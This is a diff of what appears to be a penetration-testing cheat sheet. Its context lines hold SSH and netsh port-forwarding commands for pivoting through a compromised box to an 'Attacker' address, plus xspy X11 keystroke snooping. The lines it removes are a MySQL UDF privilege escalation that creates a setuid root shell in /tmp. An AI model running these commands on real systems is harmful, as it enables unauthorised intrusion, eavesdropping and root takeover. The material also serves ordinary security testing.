@@ -49,8 +49,8 @@
 |ssh -N -f -D 8888 -p 22000 j0hn@192.168.13.252 |
 |ssh -nNT -R 3389:localhost:3389 user@pivot host #Remote Port Forward |
 |netsh interface portproxy add v4tov4 listenport=1111 Compromise Box=x.x.x.1 connectport=1111 connectaddress=Attacker|
-|netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10|
-|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1connectport=9001 connectaddress=x.x.x.100|
+|netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10 |
+|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1 connectport=9001 connectaddress=x.x.x.100 |
 
 
 
@@ -88,7 +88,6 @@
 |create table npn(line blob); |
 | xdpyinfo -display 192.168.2.75:0 | head -n 5 |
 |xspy -display 192.168.1.23:0 -delay 100|
-| create function do_system returns integer soname 'raptor_udf2.so'; |
-| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
+
 
 
